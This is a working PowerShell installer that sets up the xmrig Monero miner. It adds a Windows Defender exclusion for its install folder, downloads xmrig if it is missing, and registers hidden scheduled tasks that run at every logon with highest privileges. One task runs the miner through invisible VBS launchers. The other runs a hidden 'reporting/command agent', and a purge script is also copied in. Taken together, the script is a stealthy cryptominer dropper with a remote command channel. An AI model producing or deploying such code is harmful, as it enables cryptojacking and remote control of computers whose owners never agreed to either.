$ErrorActionPreference = 'Stop'
$src  = $PSScriptRoot
$dest = 'C:\HyperM'
$user = "$env:USERDOMAIN\$env:USERNAME"

# Safety checks: wallet and agent settings must be filled in
if ((Get-Content -Raw "$src\config.json") -match 'YOUR_PRIMARY_XMR_ADDRESS') {
    throw "config.json still contains YOUR_PRIMARY_XMR_ADDRESS. Put your wallet address in first."
}
if ((Get-Content -Raw "$src\agent.ps1") -match 'PASTE_YOUR_MINER_SECRET_HERE' -or (Get-Content -Raw "$src\agent.ps1") -match 'YOUR-APP-NAME') {
    throw "agent.ps1 still has placeholder `$server / `$secret values. Edit it first."
}

# Stop any previous copy (safe to re-run this installer)
Unregister-ScheduledTask -TaskName 'HyperM' -Confirm:$false -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName 'HyperMAgent' -Confirm:$false -ErrorAction SilentlyContinue
Get-Process xmrig -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2

# Install folder + Defender exclusion BEFORE any miner files are written
New-Item -ItemType Directory -Force -Path $dest | Out-Null
try { Add-MpPreference -ExclusionPath $dest }
catch { Write-Warning "Could not add Defender exclusion (different antivirus?). Add $dest as an exclusion manually." }

# Get xmrig: use the local copy if present, otherwise download the official release
if (Test-Path "$src\xmrig.exe") {
    Copy-Item "$src\xmrig.exe" $dest -Force
    if (Test-Path "$src\WinRing0x64.sys") { Copy-Item "$src\WinRing0x64.sys" $dest -Force }
} else {
    Write-Host "Downloading xmrig from the official GitHub release..."
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $rel   = Invoke-RestMethod 'https://api.github.com/repos/xmrig/xmrig/releases/latest' -Headers @{ 'User-Agent' = 'hyperm' }
    $asset = $rel.assets | Where-Object { $_.name -like '*msvc-win64.zip' } | Select-Object -First 1
    if (-not $asset) { throw "Could not find the xmrig Windows download. Put xmrig.exe in this folder and run again." }
    $zip = Join-Path $env:TEMP 'xmrig.zip'
    $tmp = Join-Path $env:TEMP 'xmrig-extract'
    Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
    Invoke-WebRequest $asset.browser_download_url -OutFile $zip
    Expand-Archive $zip $tmp -Force
    $inner = Get-ChildItem $tmp -Directory | Select-Object -First 1
    Copy-Item "$($inner.FullName)\*" $dest -Force -Exclude 'config.json'
    Remove-Item $zip, $tmp -Recurse -Force -ErrorAction SilentlyContinue
}
if (-not (Test-Path "$dest\xmrig.exe")) { throw "xmrig.exe is missing from $dest (antivirus may have removed it)." }

# Config, launchers, and agent files (copied last so they always win)
Copy-Item "$src\config.json", "$src\start.bat", "$src\run-hidden.vbs", "$src\agent.ps1", "$src\run-agent-hidden.vbs", "$src\purge.ps1" $dest -Force

# Shared task settings
$trigger   = New-ScheduledTaskTrigger -AtLogOn -User $user
$trigger.Delay = 'PT30S'
$principal = New-ScheduledTaskPrincipal -UserId $user -LogonType Interactive -RunLevel Highest
$settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
             -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable

# Task 1: the miner itself, hidden
$minerAction = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "`"$dest\run-hidden.vbs`"" -WorkingDirectory $dest
Register-ScheduledTask -TaskName 'HyperM' -Action $minerAction -Trigger $trigger `
    -Principal $principal -Settings $settings -Force | Out-Null

# Task 2: the reporting/command agent, hidden
$agentAction = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "`"$dest\run-agent-hidden.vbs`"" -WorkingDirectory $dest
Register-ScheduledTask -TaskName 'HyperMAgent' -Action $agentAction -Trigger $trigger `
    -Principal $principal -Settings $settings -Force | Out-Null

# Start both right now
Start-ScheduledTask -TaskName 'HyperM'
Start-ScheduledTask -TaskName 'HyperMAgent'

Write-Host ""
Write-Host "Done. Miner + agent started, hidden, and will auto-start 30 seconds after every login."
Write-Host "Installed to: $dest"
Write-Host "Reboot this PC once so huge pages take effect (see setup notes)."